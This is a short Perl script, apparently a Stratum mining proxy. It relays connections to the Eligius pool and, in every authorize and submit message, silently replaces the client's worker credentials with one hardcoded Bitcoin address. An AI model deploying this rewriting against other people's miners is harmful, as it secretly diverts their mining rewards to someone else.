use AnyEvent;
use AnyEvent::Handle;
use AnyEvent::Socket;
use Data::Dumper;
use strict;
use warnings;
use JSON;
my %srv;
my %connections;
my %whdl;
my %shdl;
my %bundle;

my $cv = AnyEvent->condvar;
my $j=new JSON;

tcp_server("192.168.35.1", 8339, sub {
    my($fh,$host,$port) = @_;
    my $handle;
    $handle = AnyEvent::Handle->new(
	fh => $fh,
	poll => "r",
	on_error => sub {
	    my ($hdl) = @_;
	    $shdl{$hdl}->destroy();
	    delete $shdl{$hdl};
	    $hdl->destroy();
	    print "disconnected error".$host.":".$port."\n";
	               print $_[2]."\n";
	                              $_[0]->destroy;
	},
	on_eof => sub {
	    my ($hdl) = @_;
	    $shdl{$hdl}->destroy();
	    delete $shdl{$hdl};
	    $hdl->destroy();
	    print "disconnected ".$host.":".$port."\n";
	},
	on_read => sub {
	    my($self) = @_;
	    if ($shdl{$self})
	    {
		p_bundle("wr",$shdl{$self},$self->rbuf);
	    }
	    else {
		cl($self,$self->rbuf);
	    }
	    $self->rbuf="";
       }
    );
    print "connected ".$host.":".$port."\n";
    $srv{$handle} = $handle;
    return;
});
$cv->recv;
exit;
sub cl
{
    my ($whandle,$msg)=@_;
    tcp_connect("stratum.mining.eligius.st", 3334, sub {
	my ($sock) = @_
	    or die "Can't connect: $!";
	my $handle2 = AnyEvent::Handle->new(
	    fh => $sock,
	    on_read => sub { 
		my ($self)=@_;
		p_bundle("cl",$whandle,$self->rbuf);
		$self->rbuf="";
	    },
	    on_eof => sub {
		printf "cl: disc\n";
		my ($self)=@_;
		delete $connections{$self};
		delete $shdl{$self};
		$whandle->destroy;
		$self->destroy;
	    },
	);
	p_bundle("wr",$handle2,$msg);
	$connections{$handle2} = $handle2;
	$shdl{$whandle}=$handle2;
    },sub {
	my ($sock) = @_;
	print "cl: connect\n";
	return undef;
    });

}
sub p_bundle {
    my ($type,$wh,$txt)=@_;
    my $b=0;
    $txt=~s/\n//g;
    if ((substr($txt,0,1) eq '{') and (substr($txt,-1,1) ne '}')){
        $bundle{$wh}=$txt;
    }
    elsif ((substr($txt,-1,1) eq '}') and (substr($txt,0,1) ne '{')){
        $bundle{$wh}=$bundle{$wh}.$txt;
        $b=1;
    }
    elsif ((substr($txt,-1,1) ne '}') and (substr($txt,0,1) ne '{')){
        $bundle{$wh}=$bundle{$wh}.$txt;
    }
    else {
        $bundle{$wh}=$txt;
        $b=1;
    }
    if ($b==1){
        while ($bundle{$wh}=~/({.*?})/g){
             p_pkt($type,$wh,$1);
        }
	delete $bundle{$wh};             
    }
}
sub p_pkt {
    my ($type,$wh,$txt)=@_;
    my $jt=$j->decode($txt);
    if (exists $jt->{'method'}){
	if ($jt->{'method'} eq 'mining.authorize') {
	    $jt->{'params'}[0]='1LkvMbhGnbs9hfCmRkZhAdNfvg7kzWrQXh';
	    $jt->{'params'}[1]='x';
	}
	if ($jt->{'method'} eq 'mining.submit') {
	    $jt->{'params'}[0]='1LkvMbhGnbs9hfCmRkZhAdNfvg7kzWrQXh';
	    print "bingo\n";
	}
    }
    $wh->push_write($j->encode($jt)."\n");
}
